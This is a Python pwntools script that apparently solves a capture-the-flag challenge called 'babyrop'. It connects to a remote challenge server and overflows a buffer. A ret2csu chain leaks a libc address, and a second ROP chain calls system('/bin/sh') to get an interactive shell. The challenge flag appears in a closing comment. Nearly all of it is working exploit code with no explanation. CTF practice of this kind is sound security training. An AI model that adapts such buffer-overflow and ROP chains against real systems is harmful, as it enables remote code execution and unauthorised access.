from pwn import *


binpath = './babyrop'
elf = ELF(binpath)
# libc = elf.libc
libc = ELF('./libc6_2.31-0ubuntu9.1_amd64_libcdb.so')

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = "DEBUG"

gdbscript = '''
gef
b *0x40116b
# b *0x7ffff7a33219
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('dicec.tf', 31924)

io.recvuntil(b'Your name: ')

addr_pop_rdi = 0x00000000004011d3 # : pop rdi ; ret
addr_pop_rsi_r15 = 0x00000000004011d1 # : pop rsi ; pop r15 ; ret
addr_ret = 0x000000000040101a # : ret

addr_urop_stage1 = 0x4011ca
addr_urop_stage2 = 0x4011b0

payload = b''
payload += b'A' * 0x48
payload += p64(addr_urop_stage1)
payload += p64(0)  # rbx
payload += p64(1)  # rbp
payload += p64(1)  # r12 -> edi
payload += p64(elf.got['write'])  # r13 -> rsi
payload += p64(0x8)  # r14 -> rdx
payload += p64(elf.got['write'])  # r15
payload += p64(addr_urop_stage2)
payload += p64(0xdeadbeef) * 7
payload += p64(elf.symbols['main'])

io.sendline(payload)

addr_write = u64(io.recv(8))
addr_libc = addr_write - libc.symbols['write']
print('addr_write = 0x{:x}'.format(addr_write))
print('addr_libc = 0x{:x}'.format(addr_libc))

io.recvuntil(b'Your name: ')
payload = b''
payload += b'B' * 0x48
payload += p64(addr_ret)
payload += p64(addr_pop_rdi)
payload += p64(addr_libc + next(libc.search(b'/bin/sh')))
payload += p64(addr_libc + libc.symbols['system'])
io.sendline(payload)

io.interactive()

# dice{so_let's_just_pretend_rop_between_you_and_me_was_never_meant_b1b585695bdd0bcf2d144b4b}
